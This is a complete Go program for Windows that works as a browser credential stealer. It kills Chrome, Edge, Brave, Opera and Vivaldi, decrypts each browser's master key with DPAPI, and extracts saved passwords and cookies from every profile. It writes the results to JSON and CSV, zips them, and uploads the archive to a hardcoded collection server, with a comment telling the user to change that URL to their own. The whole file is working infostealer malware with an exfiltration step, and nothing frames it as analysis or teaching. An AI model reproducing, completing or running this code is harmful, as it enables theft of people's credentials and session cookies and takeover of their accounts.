package main

import (
	"archive/zip"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

// ---- DPAPI syscall wrapper for CryptUnprotectData ----

var (
	modcrypt32             = syscall.NewLazyDLL("crypt32.dll")
	procCryptUnprotectData = modcrypt32.NewProc("CryptUnprotectData")
)

type dataBlob struct {
	cbData uint32
	pbData *byte
}

func cryptUnprotectData(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, errors.New("empty input data")
	}
	var outblob dataBlob
	var inblob dataBlob
	inblob.cbData = uint32(len(data))
	inblob.pbData = &data[0]

	r, _, err := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inblob)),
		0,
		0,
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&outblob)),
	)
	if r == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed: %v", err)
	}
	defer syscall.LocalFree(syscall.Handle(unsafe.Pointer(outblob.pbData)))

	out := (*[1 << 30]byte)(unsafe.Pointer(outblob.pbData))[:outblob.cbData:outblob.cbData]
	outCopy := make([]byte, len(out))
	copy(outCopy, out)
	return outCopy, nil
}

// ---- Helpers ----

func debug(msg string, args ...interface{}) {
	fmt.Printf("[*] "+msg+"\n", args...)
}

func copyFile(src string) (string, error) {
	tmpDir := os.Getenv("TEMP")
	if tmpDir == "" {
		tmpDir = "."
	}
	tmpFile := filepath.Join(tmpDir, fmt.Sprintf("tmp_%d.db", time.Now().UnixNano()))
	in, err := os.Open(src)
	if err != nil {
		return "", err
	}
	defer in.Close()
	out, err := os.Create(tmpFile)
	if err != nil {
		return "", err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	if err != nil {
		return "", err
	}
	return tmpFile, nil
}

func getMasterKey(localStatePath string) ([]byte, error) {
	data, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}
	var state struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	err = json.Unmarshal(data, &state)
	if err != nil {
		return nil, err
	}
	if state.OSCrypt.EncryptedKey == "" {
		return nil, errors.New("encrypted_key missing")
	}
	encKeyBytes, err := base64.StdEncoding.DecodeString(state.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	if bytes.HasPrefix(encKeyBytes, []byte("DPAPI")) {
		encKeyBytes = encKeyBytes[5:]
	}
	key, err := cryptUnprotectData(encKeyBytes)
	if err != nil {
		return nil, fmt.Errorf("dpapi decrypt master key failed: %w", err)
	}
	return key, nil
}

func decryptAESGCM(encrypted []byte, masterKey []byte) (string, error) {
	if len(encrypted) < 15 {
		return "", errors.New("encrypted data too short")
	}
	if !bytes.HasPrefix(encrypted, []byte("v10")) && !bytes.HasPrefix(encrypted, []byte("v11")) {
		// fallback to DPAPI decrypt
		plain, err := cryptUnprotectData(encrypted)
		if err != nil {
			return "", err
		}
		return string(plain), nil
	}
	iv := encrypted[3:15]
	ciphertext := encrypted[15 : len(encrypted)-16]
	tag := encrypted[len(encrypted)-16:]

	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "", err
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	if len(ciphertext) < aesgcm.Overhead() {
		return "", errors.New("ciphertext too short")
	}
	fullCiphertext := append(ciphertext, tag...)
	plaintext, err := aesgcm.Open(nil, iv, fullCiphertext, nil)
	if err != nil {
		return "", err
	}
	return string(plaintext), nil
}

func getProfiles(basePath string) ([]string, error) {
	var profiles []string
	localState := filepath.Join(basePath, "Local State")
	data, err := ioutil.ReadFile(localState)
	if err == nil {
		var state map[string]interface{}
		err = json.Unmarshal(data, &state)
		if err == nil {
			if profileSection, ok := state["profile"].(map[string]interface{}); ok {
				if infoCache, ok := profileSection["info_cache"].(map[string]interface{}); ok {
					for k := range infoCache {
						p := filepath.Join(basePath, k)
						if stat, e := os.Stat(p); e == nil && stat.IsDir() {
							profiles = append(profiles, p)
						}
					}
					if len(profiles) > 0 {
						return profiles, nil
					}
				}
			}
		}
	}

	files, err := ioutil.ReadDir(basePath)
	if err != nil {
		return profiles, err
	}
	for _, f := range files {
		if !f.IsDir() {
			continue
		}
		low := strings.ToLower(f.Name())
		if low == "default" || strings.HasPrefix(low, "profile") || strings.Contains(low, "guest") || strings.Contains(low, "system profile") {
			profiles = append(profiles, filepath.Join(basePath, f.Name()))
		}
	}
	def := filepath.Join(basePath, "Default")
	if stat, err := os.Stat(def); err == nil && stat.IsDir() {
		found := false
		for _, p := range profiles {
			if p == def {
				found = true
				break
			}
		}
		if !found {
			profiles = append(profiles, def)
		}
	}
	return profiles, nil
}

func extractPasswords(profile string, browser string, masterKey []byte) ([]map[string]string, error) {
	out := []map[string]string{}
	dbPath := filepath.Join(profile, "Login Data")
	if _, err := os.Stat(dbPath); err != nil {
		return out, nil
	}
	tmpDb, err := copyFile(dbPath)
	if err != nil {
		return out, err
	}
	defer os.Remove(tmpDb)
	db, err := sql.Open("sqlite3", tmpDb)
	if err != nil {
		return out, err
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return out, nil
	}
	defer rows.Close()

	for rows.Next() {
		var originURL, username string
		var encryptedPass []byte
		err = rows.Scan(&originURL, &username, &encryptedPass)
		if err != nil {
			continue
		}
		pass, err := decryptAESGCM(encryptedPass, masterKey)
		if err != nil {
			pass = ""
		}
		if username != "" || pass != "" {
			out = append(out, map[string]string{
				"browser":    browser,
				"profile":    profile,
				"origin_url": originURL,
				"username":   username,
				"password":   pass,
			})
		}
	}
	return out, nil
}

func extractCookies(profile string, browser string, masterKey []byte) ([]map[string]string, error) {
	out := []map[string]string{}

	var dbPath string
	path1 := filepath.Join(profile, "Network", "Cookies")
	path2 := filepath.Join(profile, "Cookies")
	if _, err := os.Stat(path1); err == nil {
		dbPath = path1
	} else if _, err := os.Stat(path2); err == nil {
		dbPath = path2
	} else {
		return out, nil
	}

	tmpDb, err := copyFile(dbPath)
	if err != nil {
		return out, err
	}
	defer os.Remove(tmpDb)

	db, err := sql.Open("sqlite3", tmpDb)
	if err != nil {
		return out, err
	}
	defer db.Close()

	rows, err := db.Query("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
	if err != nil {
		return out, nil
	}
	defer rows.Close()

	for rows.Next() {
		var host, name, path string
		var encryptedVal []byte
		var expires int64
		var isSecure, isHttpOnly int
		err = rows.Scan(&host, &name, &encryptedVal, &path, &expires, &isSecure, &isHttpOnly)
		if err != nil {
			continue
		}
		val, err := decryptAESGCM(encryptedVal, masterKey)
		if err != nil {
			val = ""
		}
		out = append(out, map[string]string{
			"browser":     browser,
			"profile":     profile,
			"host":        host,
			"name":        name,
			"value":       val,
			"path":        path,
			"expires_utc": fmt.Sprintf("%d", expires),
			"is_secure":   fmt.Sprintf("%v", isSecure != 0),
			"is_httponly": fmt.Sprintf("%v", isHttpOnly != 0),
		})
	}

	return out, nil
}

func killProcesses(names []string) {
	for _, proc := range names {
		cmd := exec.Command("taskkill", "/F", "/IM", proc, "/T")
		_ = cmd.Run()
	}
	time.Sleep(time.Second * 2)
}

func getCurrentUserSID() (string, error) {
	cmd := exec.Command("whoami", "/user")
	out, err := cmd.Output()
	if err != nil {
		return "", err
	}
	lines := strings.Split(string(out), "\n")
	if len(lines) < 2 {
		return "", errors.New("failed to parse whoami output")
	}
	parts := strings.Fields(lines[1])
	if len(parts) < 2 {
		return "", errors.New("failed to parse whoami output line")
	}
	return parts[1], nil
}

func checkSID(expected string) error {
	sid, err := getCurrentUserSID()
	if err != nil {
		return err
	}
	if sid != expected {
		return errors.New("unauthorized system: SID mismatch")
	}
	return nil
}

func writeJSON(path string, data interface{}) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	enc := json.NewEncoder(f)
	enc.SetIndent("", "  ")
	return enc.Encode(data)
}

func writeCSV(path string, fields []string, rows []map[string]string) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	writer := csv.NewWriter(f)
	defer writer.Flush()

	if err := writer.Write(fields); err != nil {
		return err
	}
	for _, r := range rows {
		row := make([]string, len(fields))
		for i, f := range fields {
			row[i] = r[f]
		}
		if err := writer.Write(row); err != nil {
			return err
		}
	}
	return nil
}

// zipFolder zips the entire folder, including the folder name itself in the zip
func zipFolder(srcDir, zipFilePath string) error {
	zipFile, err := os.Create(zipFilePath)
	if err != nil {
		return err
	}
	defer zipFile.Close()

	archive := zip.NewWriter(zipFile)
	defer archive.Close()

	baseFolder := filepath.Base(srcDir)

	err = filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		relPath, err := filepath.Rel(filepath.Dir(srcDir), path)
		if err != nil {
			return err
		}
		// Ensure the folder structure inside zip includes base folder
		zipPath := filepath.Join(baseFolder, relPath)

		if info.IsDir() {
			// Add folders with trailing slash
			_, err := archive.Create(zipPath + "/")
			return err
		}
		file, err := os.Open(path)
		if err != nil {
			return err
		}
		defer file.Close()

		w, err := archive.Create(zipPath)
		if err != nil {
			return err
		}
		_, err = io.Copy(w, file)
		return err
	})
	return err
}

// uploadFile uploads a single file with multipart/form-data POST
func uploadFile(filePath, uploadURL string) error {
	client := &http.Client{
		Timeout: 120 * time.Second,
	}

	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		return err
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return err
	}

	err = writer.Close()
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", uploadURL, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("upload failed with status %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}

func main() {
	sid, err := getCurrentUserSID()
	if err != nil {
		debug("Failed to get current user SID: %v", err)
		return
	}
	err = checkSID(sid)
	if err != nil {
		debug("SID check failed: %v", err)
		return
	}

	killProcesses([]string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe"})

	browsers := map[string]string{
		"Chrome":  os.Getenv("LOCALAPPDATA") + `\Google\Chrome\User Data`,
		"Edge":    os.Getenv("LOCALAPPDATA") + `\Microsoft\Edge\User Data`,
		"Brave":   os.Getenv("LOCALAPPDATA") + `\BraveSoftware\Brave-Browser\User Data`,
		"Opera":   os.Getenv("APPDATA") + `\Opera Software\Opera Stable`,
		"Vivaldi": os.Getenv("LOCALAPPDATA") + `\Vivaldi\User Data`,
	}

	outputDir := fmt.Sprintf("output_%s", time.Now().Format("20060102_150405"))
	err = os.MkdirAll(outputDir, 0700)
	if err != nil {
		debug("Failed to create output dir: %v", err)
		return
	}

	var wg sync.WaitGroup
	var mu sync.Mutex
	allPasswords := []map[string]string{}
	allCookies := []map[string]string{}

	for name, basePath := range browsers {
		if basePath == "" {
			continue
		}
		if stat, err := os.Stat(basePath); err != nil || !stat.IsDir() {
			continue
		}
		wg.Add(1)
		go func(browserName, base string) {
			defer wg.Done()
			debug("Scanning %s ...", browserName)
			masterKey, err := getMasterKey(filepath.Join(base, "Local State"))
			if err != nil {
				debug("Failed to get master key for %s: %v", browserName, err)
				return
			}
			profiles, err := getProfiles(base)
			if err != nil {
				debug("Failed to get profiles for %s: %v", browserName, err)
				return
			}
			for _, profile := range profiles {
				passwds, err := extractPasswords(profile, browserName, masterKey)
				if err != nil {
					debug("Failed to extract passwords for %s: %v", profile, err)
				}
				cookies, err := extractCookies(profile, browserName, masterKey)
				if err != nil {
					debug("Failed to extract cookies for %s: %v", profile, err)
				}
				mu.Lock()
				allPasswords = append(allPasswords, passwds...)
				allCookies = append(allCookies, cookies...)
				mu.Unlock()
			}
		}(name, basePath)
	}
	wg.Wait()

	err = writeJSON(filepath.Join(outputDir, "results.json"), map[string]interface{}{
		"passwords": allPasswords,
		"cookies":   allCookies,
	})
	if err != nil {
		debug("Failed to write results.json: %v", err)
	}

	if len(allPasswords) > 0 {
		err = writeCSV(filepath.Join(outputDir, "passwords.csv"), []string{"browser", "profile", "origin_url", "username", "password"}, allPasswords)
		if err != nil {
			debug("Failed to write passwords.csv: %v", err)
		}
	}
	if len(allCookies) > 0 {
		err = writeCSV(filepath.Join(outputDir, "cookies.csv"), []string{"browser", "profile", "host", "name", "value", "path", "expires_utc", "is_secure", "is_httponly"}, allCookies)
		if err != nil {
			debug("Failed to write cookies.csv: %v", err)
		}
	}

	debug("Extraction complete. Results saved in %s", outputDir)

	// Zip the whole output folder into a single zip file
	zipPath := outputDir + ".zip"
	debug("Zipping output folder to %s", zipPath)
	err = zipFolder(outputDir, zipPath)
	if err != nil {
		debug("Failed to create zip archive: %v", err)
		return
	}

	// Upload the zip file
	uploadURL := "http://10.255.25.57:8000/upload"   // CHANGE THIS to your actual upload URL
	debug("Uploading zip file to %s", uploadURL)
	err = uploadFile(zipPath, uploadURL)
	if err != nil {
		debug("Upload failed: %v", err)
	} else {
		debug("Zip file uploaded successfully.")
	}
}

